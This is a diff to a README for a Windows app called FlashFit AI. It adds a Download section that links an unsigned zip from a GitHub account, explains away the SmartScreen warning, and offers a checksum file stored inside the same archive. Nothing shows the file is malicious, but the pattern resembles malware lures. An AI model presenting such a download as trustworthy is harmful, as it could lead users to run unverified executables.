@@ -10,6 +10,18 @@ combination of settings for each model and material is still needlessly hard.
 
 **Windows only.** The macOS build is discontinued and no longer supported.
 
+## Download
+
+[**FlashFit AI 4.3.0 — Windows 11 x64**](https://github.com/alexmark53343-byte/FlashFit-AI/raw/main/downloads/FlashFit-AI-Windows-11-x64.zip) · 3.2 MB
+
+Extract and run. Nothing to install. The AI model is not in the download — the
+application fetches it the first time you choose one, so the app itself stays
+small.
+
+Compare the executable against `SHA256SUMS.txt` inside the archive. It is not
+Authenticode-signed yet, so Windows SmartScreen will report an unknown
+publisher.
+
 ---
 
 ## What it does
